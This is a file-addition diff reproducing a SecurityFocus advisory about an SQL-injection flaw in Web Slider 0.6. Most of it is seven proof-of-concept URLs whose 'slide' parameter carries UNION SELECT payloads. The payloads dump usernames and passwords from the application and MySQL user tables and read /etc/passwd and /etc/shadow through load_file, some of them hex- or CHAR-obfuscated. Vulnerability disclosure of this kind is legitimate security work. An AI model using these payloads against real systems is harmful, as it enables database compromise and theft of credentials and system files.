@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/29296/info
+
+Web Slider is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Web Slider 0.6 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/html/index.php?action=slides&group=Introduccion&slide='+union+select+0,concat(CHAR(0x75,0x73,0x65,0x72,0x3A,0xD,0xA),username,0x3a,password),2,concat(database(),char(58),0x2020,version()),4+from+users/*
+http://www.example.com/html/index.php?action=slides&group=Introduccion&slide='+union+select+0,concat(user(),0x3a,password),null,concat(database(),0x2020,version()),4+from+mysql.user/*
+http://www.example.com/html/index.php?action=slides&group=Introduccion&slide='+union+select+0,load_file(0x6574632F706173737764),2,0,4+from+users/*
+http://www.example.com/html/index.php?action=slides&group=Introduccion&slide='+union+select+0,load_file(CONCAT(CHAR(0x65),CHAR(0x74),CHAR(0x63),CHAR(0x2F),CHAR(0x70),CHAR(0x61),CHAR(0x73),CHAR(0x73),CHAR(0x77),CHAR(0x64))),2,0,4+from+users/*
+http://www.example.com/html/index.php?action=slides&group=Introduccion&slide='+union+select+0,substring(load_file(0x6574632F706173737764),50),2,0,4+from+users/*
+http://www.example.com/html/index.php?action=slides&group=Introduccion&slide='+union+select+0,substring(load_file(etc/passwd),50),2,0,4+from+users/*
+http://www.example.com/html/index.php?action=slides&group=Introduccion&slide='+union+select+0,substring(load_file(etc/shadow),50),2,0,4+from+users/* 
